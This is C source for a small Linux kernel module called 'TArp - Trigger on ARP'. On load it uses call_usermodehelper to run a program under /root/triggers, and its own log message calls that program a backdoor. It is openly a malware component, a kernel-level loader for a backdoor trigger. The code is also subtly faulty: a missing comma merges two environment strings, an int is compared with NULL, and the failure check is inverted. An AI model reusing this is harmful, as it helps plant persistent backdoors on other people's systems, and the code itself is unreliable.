#include <linux/module.h>
#include <linux/init.h>
#include <linux/kmod.h>
#include <linux/kernel.h>
#define DRIVER_AUTHOR "ROPspktrGadget"
#define DRIVER_DESC "TArp - Trigger on ARP"

static int umh_test(void);

static int __init tarp_init(void)
{
    return umh_test();
}

static void __exit tarp_exit(void)
{
    printk(KERN_INFO "Goodbye cruel world.\n");
}

static int umh_test(void)
{
    int ret = 0;
    //struct subprocess_info *sub_info;
    char *argv[] = {"/root/triggers/TArp/TArp.out", NULL, NULL };
    static char *envp[] = {
        "HOME=/",
        "TERM=linux"
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

    ret = call_usermodehelper(argv[0],argv,envp, UMH_WAIT_EXEC);
    if (ret == NULL) printk(KERN_INFO "Executing backdoor failed.");
    return 0;
}


module_init(tarp_init);
module_exit(tarp_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);
